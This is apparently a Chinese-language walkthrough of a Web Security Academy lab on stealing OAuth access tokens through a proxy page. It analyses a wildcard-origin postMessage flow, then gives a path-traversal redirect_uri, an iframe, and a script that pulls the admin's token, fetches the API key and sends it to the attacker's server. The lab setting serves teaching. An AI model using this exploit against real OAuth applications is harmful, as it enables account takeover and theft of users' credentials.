# 实验：通过代理页面窃取 OAuth 访问令牌

本实验使用 OAuth 服务允许用户使用其社交媒体账户登录。OAuth 服务的验证存在缺陷，使得攻击者能够将访问令牌泄露到客户端应用程序上的任意页面。

要解决本实验，请识别客户端应用程序中的次级漏洞，并将其用作代理以窃取管理员用户账户的访问令牌。使用访问令牌获取管理员的 API 密钥，并使用实验横幅中提供的按钮提交解决方案。

管理员用户会打开您从 exploit server 发送的任何内容，并且他们始终与 OAuth 服务保持活动会话。

您可以使用以下凭据通过自己的社交媒体账户登录：`wiener:peter`。

> **注意：** 由于受害者使用 Chrome，我们建议您也使用 Chrome（或 Burp 的内置 Chromium 浏览器）来测试您的漏洞利用。

流程
- 父页面监听 message 事件
    - 当类型为 oncomment 时，发送子框架 message.data 数据到评论发布端点

- 子框架
    - 立即向父页面发送 message，类型 onload，内容 URL 字符串
    - 监听表单提交事件，向父页面发送 message，类型 oncomment，内容为表单字段、URL hash

- 分析
    - 此处父页面监听**任何** message 事件，即可尝试将文章页面加载到子框架中，由攻击者页面作为父页面发送 message
        - 但无法直接使用
    - 子框架拥有两种类型的 message，其中触发表单的行为似乎无法实现。无条件发送 URL 字符串的部分似乎可用。
        - 尝试将子框架页面加载到攻击者页面的子框架中，授权回调设置到子框架页面，子框架页面将向攻击者的父页面发送 URL 字符串的 message
        - 子框架向通配符的任意父页面发送 message

构造
- 设置授权回调 URL
    - 获取初始请求
        ```http
        https://oauth-id.oauth-server.net/auth?client_id=g2t8s1rj0dqgkqntazxsh&redirect_uri=https://id.web-security-academy.net/oauth-callback&response_type=token&nonce=-134103186&scope=openid%20profile%20email
        ```
    
    - 修改回调端点到应用程序子框架页面
        `https://oauth-id.oauth-server.net/auth?client_id=g2t8s1rj0dqgkqntazxsh&redirect_uri=https://id.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-134103186&scope=openid%20profile%20email`

    - 加载后最终将访问子框架页面

- 设置攻击者载荷页面
    - 子框架 src 设置为载荷授权 URL
        ```html
        <iframe src="https://oauth-id.oauth-server.net/auth?client_id=g2t8s1rj0dqgkqntazxsh&redirect_uri=https://id.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-134103186&scope=openid%20profile%20email">
        </iframe>
        ```
    
    - 稍微修改应用程序已有的 message 通信代码
        ```html
        <script>
            console.log('start');
            window.addEventListener('message', function(e) {
                // 控制台调试信息
                // event.data 获取到 message 对象
                // event.data.data 获取到 message.data 字段
                console.log('get message:', event.data);
                console.log('get message:', event.data.data);
                // 修改或移除原 message 类型 oncomment 的分支判断
                if (e.data.type === 'onload') {
                    const data_url = new URL(event.data.data);
                    const urlSearchParams = new URLSearchParams(data_url.hash.substr(1));
                    const token = urlSearchParams.get('access_token');
                    fetch('https://oauth-id.oauth-server.net/me', {
                        method: 'GET',
                        headers: {
                        'Authorization': 'Bearer ' + token,
                        'Content-Type': 'application/json'
                        }
                    }
                    )
                    .then(r => r.json())
                    .then(j => 
                        fetch('/apikey?' + j.apikey)
                    )
                }
            }, false)
        </script>
        ```
